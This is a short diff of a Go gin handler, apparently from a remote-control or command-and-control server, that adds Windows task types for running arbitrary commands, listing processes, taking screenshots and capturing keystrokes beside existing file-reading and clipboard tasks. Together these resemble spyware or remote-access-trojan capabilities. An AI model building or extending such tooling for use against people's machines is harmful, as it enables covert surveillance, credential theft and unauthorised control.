@@ -37,18 +37,24 @@ func CreateTask() gin.HandlerFunc {
 		ctrl := middlewares.GetController(c)
 		if r.OS == definition.Windows {
 			switch r.Cmd {
-			case definition.GetFileContent:
-				t = &windows.GetFileContentTask{Path: r.Params["path"].(string)}
-				err := ctrl.ExecuteTask(r.ID, t)
-				if err != nil {
-					panic(err)
-				}
+			// case definition.GetFileContent:
+			// 	t = &windows.GetFileContentTask{Path: r.Params["path"].(string)}
 			case definition.GetClipboard:
 				t = &windows.GetClipboardTask{}
-				err := ctrl.ExecuteTask(r.ID, t)
-				if err != nil {
-					panic(err)
-				}
+			case definition.ExecCommand:
+				t = &windows.ExecCommandTask{Command: r.Params["command"].(string)}
+			case definition.GetProcessList:
+				t = &windows.GetProcessListTask{}
+			case definition.GetScreenshot:
+				t = &windows.GetScreenshotTask{}
+			case definition.ListenKeyboard:
+				t = &windows.ListenKeyboardTask{}
+			case definition.GetFileContent:
+				t = &windows.GetFileContentTask{Path: r.Params["path"].(string)}
+			}
+			err := ctrl.ExecuteTask(r.ID, t)
+			if err != nil {
+				panic(err)
 			}
 		} else if r.OS == definition.Android {
 			switch r.Cmd {
